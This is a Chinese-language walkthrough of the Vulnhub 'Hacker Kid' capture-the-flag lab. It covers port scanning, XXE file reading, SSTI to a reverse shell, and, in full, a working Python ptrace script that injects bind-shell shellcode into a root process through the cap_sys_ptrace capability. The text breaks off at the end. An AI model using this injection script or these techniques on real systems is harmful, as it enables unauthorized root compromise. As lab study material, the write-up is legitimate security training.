<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2022/11/16/Vulhub-Hacker_Kid-v1.0.1/"/>
      <url>/2022/11/16/Vulhub-Hacker_Kid-v1.0.1/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="Vulhub-Hacker-Kid-v1-0-1"><a href="#Vulhub-Hacker-Kid-v1-0-1" class="headerlink" title="Vulhub-Hacker_Kid-v1.0.1"></a>Vulhub-Hacker_Kid-v1.0.1</h1><hr><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="靶机地址："><a href="#靶机地址：" class="headerlink" title="靶机地址："></a>靶机地址：</h2><p>链接：<a href="https://www.vulnhub.com/entry/hacker-kid-101,719/">https://www.vulnhub.com/entry/hacker-kid-101,719/</a></p><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>难度：简单&#x2F;中等（中级）这个盒子是 OSCP 风格，专注于枚举，易于利用。目标是获得 root。不需要猜测或强力暴力，并且在每一步都给出适当的提示以继续前进。## 变更日志 2021-08-01 - v1.0.1 2021-06-30 - v1.0</p><h2 id="一、搭建靶机环境"><a href="#一、搭建靶机环境" class="headerlink" title="一、搭建靶机环境"></a>一、搭建靶机环境</h2><p><code>攻击机Kali</code>：</p><blockquote><p>IP地址：192.168.226.129</p></blockquote><p><code>靶机</code>：</p><blockquote><p>IP地址：192.168.226.139</p></blockquote><p><strong>注：靶机与Kali的IP地址只需要在同一局域网即可（同一个网段,即两虚拟机处于同一网络模式）</strong><br><a name="e853c040"></a></p><h2 id="二、实战"><a href="#二、实战" class="headerlink" title="二、实战"></a>二、实战</h2><h3 id="2-1网络扫描"><a href="#2-1网络扫描" class="headerlink" title="2.1网络扫描"></a>2.1网络扫描</h3><h4 id="2-1-1-启动靶机和Kali后进行扫描"><a href="#2-1-1-启动靶机和Kali后进行扫描" class="headerlink" title="2.1.1 启动靶机和Kali后进行扫描"></a>2.1.1 启动靶机和Kali后进行扫描</h4><h5 id="方法一、arp-scan-I-eth0-l-（指定网卡扫）"><a href="#方法一、arp-scan-I-eth0-l-（指定网卡扫）" class="headerlink" title="方法一、arp-scan -I eth0 -l （指定网卡扫）"></a>方法一、arp-scan -I eth0 -l （指定网卡扫）</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -I eth0 -l</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/29257370/1668421737836-7e78ceb2-a1b8-474e-ba26-e2e1fddebee4.png#averageHue=%23272d3a&clientId=u2c18d422-0f2e-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=645&id=u03e4fefe&margin=%5Bobject%20Object%5D&name=image.png&originHeight=645&originWidth=788&originalType=binary&ratio=1&rotation=0&showTitle=false&size=195508&status=done&style=none&taskId=uf051c454-9e9e-468d-bcbd-0030c2f6fd5&title=&width=788" alt="image.png"><br><a name="c81bb000"></a></p><h4 id="2-1-2-查看靶机开放的端口"><a href="#2-1-2-查看靶机开放的端口" class="headerlink" title="2.1.2 查看靶机开放的端口"></a>2.1.2 查看靶机开放的端口</h4><p>使用nmap -A(全面探测) -sV(查看版本) -T4(速度) -p-(全端口) 靶机ip查看靶机开放的端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namp -A -SV -T4 -p- 192.168.226.139</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/29257370/1668422413637-5cb7a2f6-863d-4b3b-96e7-8d8683741a43.png#averageHue=%232a3b55&clientId=u4cb3356d-f702-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=708&id=u42c58f3e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=708&originWidth=1157&originalType=binary&ratio=1&rotation=0&showTitle=false&size=323364&status=done&style=none&taskId=uacc4856d-3b01-4d5c-a880-701d41d2b32&title=&width=1157" alt="image.png">发现了3个端口，分别是53、80、9999端口，现在在这3个端口寻找突破口</p><h3 id="2-2枚举漏洞"><a href="#2-2枚举漏洞" class="headerlink" title="2.2枚举漏洞"></a>2.2枚举漏洞</h3><h4 id="2-2-1-53端口分析"><a href="#2-2-1-53端口分析" class="headerlink" title="2.2.1   53端口分析"></a>2.2.1   53端口分析</h4><p><img src="https://cdn.nlark.com/yuque/0/2022/png/29257370/1668422776344-981c7268-b68d-48bf-8ac8-2fb9ba8c31d5.png#averageHue=%23fefefe&clientId=ue3422caa-72df-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=704&id=uf09bdb65&margin=%5Bobject%20Object%5D&name=image.png&originHeight=704&originWidth=1307&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33662&status=done&style=none&taskId=ua2c71c42-9f7b-46cc-981a-9166eecb9e1&title=&width=1307" alt="image.png">。。。。这端口先放着，暂时弄不了</p><h4 id="2-2-2-80端口分析"><a href="#2-2-2-80端口分析" class="headerlink" title="2.2.2   80端口分析"></a>2.2.2   80端口分析</h4><p>访问页面<img src="https://cdn.nlark.com/yuque/0/2022/png/29257370/1668423233895-e7c3f227-31cd-4ea1-a176-8f209472f7b7.png#averageHue=%230d0e17&clientId=ue3422caa-72df-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=911&id=u545a5064&margin=%5Bobject%20Object%5D&name=image.png&originHeight=911&originWidth=1429&originalType=binary&ratio=1&rotation=0&showTitle=false&size=34207&status=done&style=none&taskId=ufe58aa7c-2a41-4c39-8661-18baf512bc3&title=&width=1429" alt="image.png">                                                                      2.2.2.2.1图试试访问robots.txt啥也没有<img src="https://cdn.nlark.com/yuque/0/2022/png/29257370/1668423296486-97d6b8e4-0915-4da3-b175-dd5d01f8e211.png#averageHue=%23fcfcfb&clientId=ue3422caa-72df-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=465&id=u06263adb&margin=%5Bobject%20Object%5D&name=image.png&originHeight=465&originWidth=1106&originalType=binary&ratio=1&rotation=0&showTitle=false&size=44825&status=done&style=none&taskId=u294447ac-85c9-4631-adc2-94574abca28&title=&width=1106" alt="image.png">2.2.2.2.2图老样子上扫描器扫一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.6.138:1337/</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2022/png/29257370/1668423539877-ef571602-1671-437a-be6a-61043dc61fd6.png#averageHue=%232a303c&clientId=ue3422caa-72df-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=660&id=ud188cdc1&margin=%5Bobject%20Object%5D&name=image.png&originHeight=660&originWidth=819&originalType=binary&ratio=1&rotation=0&showTitle=false&size=156065&status=done&style=none&taskId=u673b9228-3ecd-484a-905c-da8bcb7ae33&title=&width=819" alt="image.png">2.2.2.2.3图原以为找到了登录窗口结果发现就是一个换皮首页<img src="https://cdn.nlark.com/yuque/0/2022/png/29257370/1668423627274-d443e817-5598-4c81-aeaf-92d21e9e9c93.png#averageHue=%23fdfdfc&clientId=uecc5d3b9-835d-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=718&id=ubc33f694&margin=%5Bobject%20Object%5D&name=image.png&originHeight=718&originWidth=1232&originalType=binary&ratio=1&rotation=0&showTitle=false&size=72025&status=done&style=none&taskId=ua1782cc6-21a8-4943-8235-d10bef7d4c8&title=&width=1232" alt="image.png">2.2.2.2.4图</p><p>只能用禁忌中的黑魔法来寻找突破点了<img src="https://cdn.nlark.com/yuque/0/2022/jpeg/29257370/1668423687177-0768fee8-3da5-454b-9d34-318cd704d154.jpeg#averageHue=%23c5c5c5&clientId=uecc5d3b9-835d-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=P9WxP&margin=%5Bobject%20Object%5D&originHeight=200&originWidth=200&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u1d027f1c-bb93-4282-b5de-878ddd175b3&title=">好了，已经知道怎么突破网站了，居然是首页的前端源代码的注释给了传参值，这谁想到的啊<img src="https://cdn.nlark.com/yuque/0/2022/png/29257370/1668424239831-0f05c3b4-29d1-4e79-aa24-852f43492d6c.png#averageHue=%23fdfdfd&clientId=uecc5d3b9-835d-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=690&id=ub8989dae&margin=%5Bobject%20Object%5D&name=image.png&originHeight=690&originWidth=1281&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19117&status=done&style=none&taskId=ua0fa5ffa-c62a-4fc3-8f01-2594be995e4&title=&width=1281" alt="image.png">2.2.2.2.5图我们试试传参<img src="https://cdn.nlark.com/yuque/0/2022/png/29257370/1668424406609-04f61791-6df3-4cda-af7f-8a89435a7d8e.png#averageHue=%2312141d&clientId=uecc5d3b9-835d-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=649&id=uc3f33754&margin=%5Bobject%20Object%5D&name=image.png&originHeight=649&originWidth=1134&originalType=binary&ratio=1&rotation=0&showTitle=false&size=68519&status=done&style=none&taskId=u332a9973-af39-47d0-bef3-ef05a612b4d&title=&width=1134" alt="image.png">2.2.2.2.6图这小黑客，让我们多找一下他，我们直接上burp爆破<img src="https://cdn.nlark.com/yuque/0/2022/png/29257370/1668424828859-69e777cf-de2f-414d-8edd-2e3d97cec4e6.png#averageHue=%23f7f6f6&clientId=uecc5d3b9-835d-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=781&id=ud7c4e38d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=781&originWidth=1173&originalType=binary&ratio=1&rotation=0&showTitle=false&size=84027&status=done&style=none&taskId=u64c198a4-9164-459b-8a9f-68d063df36c&title=&width=1173" alt="image.png">2.2.2.2.7图发现22出东西了，我们来看看<img src="https://cdn.nlark.com/yuque/0/2022/png/29257370/1668424911868-0158a979-4972-4b66-a479-ee669405cc5f.png#averageHue=%2312141d&clientId=uecc5d3b9-835d-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=822&id=uc62c09ee&margin=%5Bobject%20Object%5D&name=image.png&originHeight=822&originWidth=1341&originalType=binary&ratio=1&rotation=0&showTitle=false&size=109753&status=done&style=none&taskId=ud4f95bfe-2a9d-437e-b73d-7c545844c4d&title=&width=1341" alt="image.png">2.2.2.2.8图这黑客小子说，自己不是一个傻黑客，他创建了许多子域hackers.blackhat.loca，我们添加到host中<img src="https://cdn.nlark.com/yuque/0/2022/png/29257370/1668425215119-ee521f81-5090-43a8-94a0-1fc62e5e5f71.png#averageHue=%232e313a&clientId=uecc5d3b9-835d-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=618&id=u5b9565e4&margin=%5Bobject%20Object%5D&name=image.png&originHeight=618&originWidth=836&originalType=binary&ratio=1&rotation=0&showTitle=false&size=40899&status=done&style=none&taskId=u60586c09-2e44-4a05-b1b9-707399bca90&title=&width=836" alt="image.png">2.2.2.2.9图接下来访问试试<img src="https://cdn.nlark.com/yuque/0/2022/png/29257370/1668425286989-64f89d81-e001-4deb-820f-a358639a7c13.png#averageHue=%2312141d&clientId=uecc5d3b9-835d-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=799&id=u724b608e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=799&originWidth=1306&originalType=binary&ratio=1&rotation=0&showTitle=false&size=90760&status=done&style=none&taskId=u204b15e8-6c6c-490e-b221-8501a35e648&title=&width=1306" alt="image.png">2.2.2.2.10图不过2.2.2.2.8图上面黑客小子说过他有许多子域，所以我们用dig一一搜索出来<img src="https://cdn.nlark.com/yuque/0/2022/png/29257370/1668426588741-a706e4ae-be54-437d-a3b5-7980888e0d97.png#averageHue=%23263345&clientId=uecc5d3b9-835d-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=593&id=u4d980386&margin=%5Bobject%20Object%5D&name=image.png&originHeight=593&originWidth=857&originalType=binary&ratio=1&rotation=0&showTitle=false&size=168214&status=done&style=none&taskId=u513c4bfd-a215-40e6-aafb-fc271d4269c&title=&width=857" alt="image.png">2.2.2.2.11图这些域名再添加进去hosts，访问页面后发现注册页面<img src="https://cdn.nlark.com/yuque/0/2022/png/29257370/1668427389626-1c7a2bba-1500-4e7a-9e22-3318bb030738.png#averageHue=%231c222c&clientId=uecc5d3b9-835d-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=690&id=u1fe92617&margin=%5Bobject%20Object%5D&name=image.png&originHeight=690&originWidth=1305&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1345852&status=done&style=none&taskId=u7babd706-9f05-430d-a00b-e48b713b51b&title=&width=1305" alt="image.png">2.2.2.2.11图选择注册但一直是邮箱不匹配，但我们查看源码时发现网站有XML<img src="https://cdn.nlark.com/yuque/0/2022/png/29257370/1668479766289-9ef3ca88-2fe8-4324-9a60-13a8cd11fb60.png#averageHue=%23fdfbfa&clientId=uf5bc22af-a5c1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=502&id=ude0a88e9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=628&originWidth=1176&originalType=binary&ratio=1&rotation=0&showTitle=false&size=155639&status=done&style=none&taskId=u0815b38c-c1d8-479a-a96b-38b67b7817b&title=&width=940.8" alt="image.png">2.2.2.2.12图在2.2.2.2.11图中可以看到是有xml的，这时我们可以试试XXE注入试试<img src="https://cdn.nlark.com/yuque/0/2022/png/29257370/1668480425223-3cf2e60c-36ae-4c04-b939-3e355ddfba4f.png#averageHue=%23f5f5f4&clientId=uf5bc22af-a5c1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=519&id=u3fab5d81&margin=%5Bobject%20Object%5D&name=image.png&originHeight=649&originWidth=1132&originalType=binary&ratio=1&rotation=0&showTitle=false&size=111294&status=done&style=none&taskId=u2cb7c15c-e648-46a3-b926-7e065fe7732&title=&width=905.6" alt="image.png">2.2.2.2.12图成功读取到了etc&#x2F;passwd中的值，我们使用权限比较高的saket账号查看他账户下有没有 .ssh，.bashrc 等文件</p><p>.ssh 中的文件看不到，但有,bashrc<img src="https://cdn.nlark.com/yuque/0/2022/png/29257370/1668480987027-eea5e04b-a69d-4cbb-b626-d27c47ca5dc4.png#averageHue=%23f0f0f0&clientId=uf5bc22af-a5c1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=519&id=u883888b9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=649&originWidth=1209&originalType=binary&ratio=1&rotation=0&showTitle=false&size=202236&status=done&style=none&taskId=u2634db5d-a93f-4ace-970e-918ef79a140&title=&width=967.2" alt="image.png">2.2.2.2.13图base64解密后得到，账户和密码<img src="https://cdn.nlark.com/yuque/0/2022/png/29257370/1668480974928-464ddb72-502d-4559-a29f-98e396965486.png#averageHue=%23fbfbfb&clientId=uf5bc22af-a5c1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=126&id=uaf9dd324&margin=%5Bobject%20Object%5D&name=image.png&originHeight=157&originWidth=1206&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16798&status=done&style=none&taskId=ucaf9b7e8-6957-49bc-8a25-b0748d33965&title=&width=964.8" alt="image.png">2.2.2.2.14图</p><p>9999端口有登录页面，我们上那边试试</p><h4 id="2-2-3-9999端口分析"><a href="#2-2-3-9999端口分析" class="headerlink" title="2.2.3   9999端口分析"></a>2.2.3   9999端口分析</h4><p>用2.2.2.2.14图的账户密码进行登录<img src="https://cdn.nlark.com/yuque/0/2022/png/29257370/1668481219993-be5fa52d-4428-442d-b61d-a28daa22366b.png#averageHue=%23d4bb9d&clientId=uf5bc22af-a5c1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=289&id=u130fd167&margin=%5Bobject%20Object%5D&name=image.png&originHeight=361&originWidth=1152&originalType=binary&ratio=1&rotation=0&showTitle=false&size=46195&status=done&style=none&taskId=u675c7fb0-820a-47ae-bdad-58018d46f33&title=&width=921.6" alt="image.png">2.2.2.3.1图数据错了，我们换个账户名试试<img src="https://cdn.nlark.com/yuque/0/2022/png/29257370/1668481345126-6f5685cc-8b92-4808-99a5-bfc671b4e580.png#averageHue=%2354473c&clientId=uf5bc22af-a5c1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=539&id=u0d6e0b2b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=674&originWidth=1065&originalType=binary&ratio=1&rotation=0&showTitle=false&size=101247&status=done&style=none&taskId=ub16cb524-3d5d-4886-bf5e-929481fdf66&title=&width=852" alt="image.png">2.2.2.3.2图成功登录，黑客小子让我告诉他我的名字，使用get请求发送一个name传参<img src="https://cdn.nlark.com/yuque/0/2022/png/29257370/1668481476204-da8ce202-f40f-47f1-8405-2b6028342bbd.png#averageHue=%23010100&clientId=uf5bc22af-a5c1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=362&id=u81af9fc1&margin=%5Bobject%20Object%5D&name=image.png&originHeight=452&originWidth=1066&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31089&status=done&style=none&taskId=u7601b55d-c19e-4340-b315-c32159c8b9c&title=&width=852.8" alt="image.png">2.2.2.3.3图怀疑有sql注入，但跑了一遍啥也没有之前2.2.2.2.14图发现了python作为后端语言最有可能存在的漏洞也就是SSTI模板注入</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/29257370/1668482218028-5f54c63a-8811-42cf-9c12-13ab3982bbe5.png#averageHue=%23cfb8a0&clientId=uf5bc22af-a5c1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=336&id=u2ab9f443&margin=%5Bobject%20Object%5D&name=image.png&originHeight=420&originWidth=989&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35460&status=done&style=none&taskId=u820dbaba-1097-4fcc-bd2f-25d2ff05206&title=&width=791.2" alt="image.png">2.2.2.3.4图尝试反弹shell<img src="https://cdn.nlark.com/yuque/0/2022/png/29257370/1668482487114-221ca101-c024-4e28-bc85-be0c8efdcf6d.png#averageHue=%2324252e&clientId=uf5bc22af-a5c1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=307&id=u31f6b9ae&margin=%5Bobject%20Object%5D&name=image.png&originHeight=384&originWidth=976&originalType=binary&ratio=1&rotation=0&showTitle=false&size=103223&status=done&style=none&taskId=u3bc3272c-5db1-4a49-92d1-7b3ae8856e8&title=&width=780.8" alt="image.png">2.2.2.3.5图报错了，我们url、编码再访问试试<img src="https://cdn.nlark.com/yuque/0/2022/png/29257370/1668482666875-04262604-a569-4469-b8f8-d988521de7bb.png#averageHue=%233c8cbf&clientId=uf5bc22af-a5c1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=614&id=uabce4f18&margin=%5Bobject%20Object%5D&name=image.png&originHeight=768&originWidth=1240&originalType=binary&ratio=1&rotation=0&showTitle=false&size=226789&status=done&style=none&taskId=u79d6145e-8b6d-483a-a1e2-7facfafea9e&title=&width=992" alt="image.png">2.2.2.3.6图成功了</p><h3 id="3-3权限提升"><a href="#3-3权限提升" class="headerlink" title="3.3权限提升"></a>3.3权限提升</h3><h4 id="3-3-1判断提权条件"><a href="#3-3-1判断提权条件" class="headerlink" title="3.3.1判断提权条件"></a>3.3.1判断提权条件</h4><h5 id="3-3-1-1cap-sys-ptrace-ep提权"><a href="#3-3-1-1cap-sys-ptrace-ep提权" class="headerlink" title="3.3.1.1cap_sys_ptrace+ep提权"></a>3.3.1.1cap_sys_ptrace+ep提权</h5><p>补充知识： Capabilities机制是在Linux内核2.2之后引入的，原理很简单，就是将之前与超级用户root（UID&#x3D;0）关联的特权细分为不同的功能组，Capabilites作为线程（Linux并不真正区分进程和线程）的属性存在，每个功能组都可以独立启用和禁用。其本质上就是将内核调用分门别类，具有相似功能的内核调用被分到同一组中。 这样一来，权限检查的过程就变成了：在执行特权操作时，如果线程的有效身份不是root，就去检查其是否具有该特权操作所对应的capabilities，并以此为依据，决定是否可以执行特权操作。 如果Capabilities设置不正确，就会让攻击者有机可乘，实现权限提升。 使用下面的这条命令可以用于发现具有Capabilities特殊操作权限的程序。&#x2F;usr&#x2F;sbin&#x2F;getcap -r &#x2F; 2&gt;&#x2F;dev&#x2F;null      # -r 递归查询 2&gt;&#x2F;dev&#x2F;null 错误信息从定向到null<img src="https://cdn.nlark.com/yuque/0/2022/png/29257370/1668483195413-26fb11c5-9b1d-4f29-b316-2cf7bcba292a.png#averageHue=%232d313c&clientId=uf5bc22af-a5c1-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=282&id=uc6179f4f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=353&originWidth=841&originalType=binary&ratio=1&rotation=0&showTitle=false&size=77560&status=done&style=none&taskId=u03500fb0-45c2-4775-aafb-3489085e9f0&title=&width=672.8" alt="image.png">2.2.2.3.6图通过上图我们发现python具备cap_sys_ptrace+ep 能力，所以我们可以对其进行利用然后进行提权。这里需要用到一个提权脚本，这个脚本的作用就是对root权限的进程注入python类型shellcode，利用pythono具备的cap_sys_ptrace+ep 能力实现权限提升，该脚本如果执行成功，会在靶机的本地监听5600端口，我们也可以修改shellcode部分让其监听其他端口。网上脚本被删了，但找到了脚本源码，copy到本地然后开放下载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"># inject.py# The C program provided at the GitHub Link given below can be used as a reference for writing the python script.</span><br><span class="line"># GitHub Link: https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c </span><br><span class="line"> </span><br><span class="line">import ctypes</span><br><span class="line">import sys</span><br><span class="line">import struct</span><br><span class="line"> </span><br><span class="line"># Macros defined in &lt;sys/ptrace.h&gt;</span><br><span class="line"># https://code.woboq.org/qt5/include/sys/ptrace.h.html</span><br><span class="line"> </span><br><span class="line">PTRACE_POKETEXT   = 4</span><br><span class="line">PTRACE_GETREGS    = 12</span><br><span class="line">PTRACE_SETREGS    = 13</span><br><span class="line">PTRACE_ATTACH     = 16</span><br><span class="line">PTRACE_DETACH     = 17</span><br><span class="line"> </span><br><span class="line"># Structure defined in &lt;sys/user.h&gt;</span><br><span class="line"># https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct</span><br><span class="line"> </span><br><span class="line">class user_regs_struct(ctypes.Structure):</span><br><span class="line">    _fields_ = [</span><br><span class="line">        (&quot;r15&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;r14&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;r13&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;r12&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;rbp&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;rbx&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;r11&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;r10&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;r9&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;r8&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;rax&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;rcx&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;rdx&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;rsi&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;rdi&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;orig_rax&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;rip&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;cs&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;eflags&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;rsp&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;ss&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;fs_base&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;gs_base&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;ds&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;es&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;fs&quot;, ctypes.c_ulonglong),</span><br><span class="line">        (&quot;gs&quot;, ctypes.c_ulonglong),</span><br><span class="line">    ]</span><br><span class="line"> </span><br><span class="line">libc = ctypes.CDLL(&quot;libc.so.6&quot;)</span><br><span class="line"> </span><br><span class="line">pid=int(sys.argv[1])</span><br><span class="line"> </span><br><span class="line"># Define argument type and respone type.</span><br><span class="line">libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]</span><br><span class="line">libc.ptrace.restype = ctypes.c_uint64</span><br><span class="line"> </span><br><span class="line"># Attach to the process</span><br><span class="line">libc.ptrace(PTRACE_ATTACH, pid, None, None)</span><br><span class="line">registers=user_regs_struct()</span><br><span class="line"> </span><br><span class="line"># Retrieve the value stored in registers</span><br><span class="line">libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))</span><br><span class="line"> </span><br><span class="line">print(&quot;Instruction Pointer: &quot; + hex(registers.rip))</span><br><span class="line"> </span><br><span class="line">print(&quot;Injecting Shellcode at: &quot; + hex(registers.rip))</span><br><span class="line"> </span><br><span class="line"># Shell code copied from exploit db.</span><br><span class="line">shellcode=&quot;\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05&quot;</span><br><span class="line"> </span><br><span class="line"># Inject the shellcode into the running process byte by byte.</span><br><span class="line">for i in xrange(0,len(shellcode),4):</span><br><span class="line"> </span><br><span class="line">  # Convert the byte to little endian.</span><br><span class="line">  shellcode_byte_int=int(shellcode[i:4+i].encode(&#x27;hex&#x27;),16)</span><br><span class="line">  shellcode_byte_little_endian=struct.pack(&quot;&lt;I&quot;, shellcode_byte_int).rstrip(&#x27;\x00&#x27;).encode(&#x27;hex&#x27;)</span><br><span class="line">  shellcode_byte=int(shellcode_byte_little_endian,16)</span><br><span class="line"> </span><br><span class="line">  # Inject the byte.</span><br><span class="line">  libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)</span><br><span class="line"> </span><br><span class="line">print(&quot;Shellcode Injected!!&quot;)</span><br><span class="line"> </span><br><span class="line"># Modify the instuction pointer</span><br><span class="line">registers.rip=registers.rip+2</span><br><span class="line"> </span><br><span class="line"># Set the registers</span><br><span class="line">libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))</span><br><span class="line"> </span><br><span class="line">print(&quot;Final Instruction Pointer: &quot; + hex(registers.rip))</span><br><span class="line"> </span><br><span class="line"># Detach from the process.</span><br><span class="line">libc.ptrace(PTRACE_DETACH, pid, None, None)</span><br></pre></td></tr></table></figure><p>这个脚本需要注入到root权限的进程才能使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ps -aef | grep root   查看root权限进程</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">python2.7 inject.py xxx   代表root进程</span><br></pre></td></tr></table></figure><p>![image.png](<a 